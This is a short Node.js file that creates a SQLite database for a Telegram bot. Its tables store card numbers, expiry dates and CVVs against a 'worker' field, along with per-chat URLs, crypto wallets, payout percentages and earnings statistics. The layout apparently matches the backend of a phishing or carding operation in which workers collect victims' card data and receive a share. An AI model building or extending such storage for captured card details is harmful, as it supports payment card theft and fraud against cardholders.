const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./telegram_bot.db');

db.serialize(() => {
  // Create a table for wallets if it doesn't exist

  db.run("CREATE TABLE IF NOT EXISTS wallets (chat_id INTEGER PRIMARY KEY, wallet TEXT, summ REAL DEFAULT 0)");

  // Create a table for URLs if it doesn't exist
  db.run("CREATE TABLE IF NOT EXISTS urls (chat_id INTEGER, url TEXT)");

  // Create a table for card_data if it doesn't exist
  db.run("CREATE TABLE IF NOT EXISTS card_data (id INTEGER PRIMARY KEY AUTOINCREMENT, userName TEXT, userCardNumber TEXT, userExpiry TEXT, userCvv TEXT, totalPrice REAL, worker TEXT, transactionId TEXT)");

  // Create a table for approved_payments if it doesn't exist
  db.run("CREATE TABLE IF NOT EXISTS approved_payments (transaction_id TEXT, user_name TEXT, card_number TEXT, expiry TEXT, cvv TEXT, total_price REAL, worker TEXT)");

  // Create a table for user information if it doesn't exist
  db.run("CREATE TABLE IF NOT EXISTS user_info (user_id INTEGER PRIMARY KEY, username TEXT)");

  // Recreate the total_statistics table
  db.run("CREATE TABLE IF NOT EXISTS total_statistics (id INTEGER PRIMARY KEY, total_sum REAL DEFAULT 0)");

  db.run(`CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)`);

  // After initializing your database
  db.run("CREATE TABLE IF NOT EXISTS user_percentages (chat_id INTEGER PRIMARY KEY, percentage INTEGER)");

  db.run("CREATE TABLE IF NOT EXISTS user_statistics (chat_id INTEGER PRIMARY KEY, total_sum REAL DEFAULT 0)");
});

module.exports = db;

